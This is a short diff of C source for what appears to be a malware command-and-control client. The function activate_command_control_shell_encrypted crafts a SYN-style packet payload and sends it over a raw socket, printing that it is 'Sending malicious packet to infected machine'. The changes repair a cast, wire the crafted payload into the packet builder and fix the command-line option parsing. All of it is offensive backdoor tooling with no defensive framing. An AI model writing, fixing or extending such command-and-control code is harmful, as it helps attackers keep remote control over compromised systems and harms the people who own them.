@@ -201,7 +201,7 @@ void activate_command_control_shell_encrypted(char* argv){
     char* payload = malloc(SYN_PACKET_PAYLOAD_LEN);
     srand(time(NULL));
     for(int ii=0; ii<SYN_PACKET_PAYLOAD_LEN; ii++){
-        payload[ii] = rand();
+        payload[ii] = (char)rand();
     }
     //Follow protocol rules
     char section[SYN_PACKET_SECTION_LEN];
@@ -231,9 +231,7 @@ void activate_command_control_shell_encrypted(char* argv){
     strncpy(payload+0x0D, result, SYN_PACKET_SECTION_LEN);
     
     
-
-
-    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, CC_PROT_SYN);
+    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, payload);
     printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
     //Sending the malicious payload
     if(rawsocket_send(packet)<0){
@@ -294,7 +292,7 @@ void main(int argc, char* argv[]){
     char path_arg[512];
 
     //Command line argument parsing
-    while ((opt = getopt(argc, argv, ":S:c:h:e")) != -1) {
+    while ((opt = getopt(argc, argv, ":S:c:e:h")) != -1) {
         switch (opt) {
         case 'S':
             print_welcome_message();
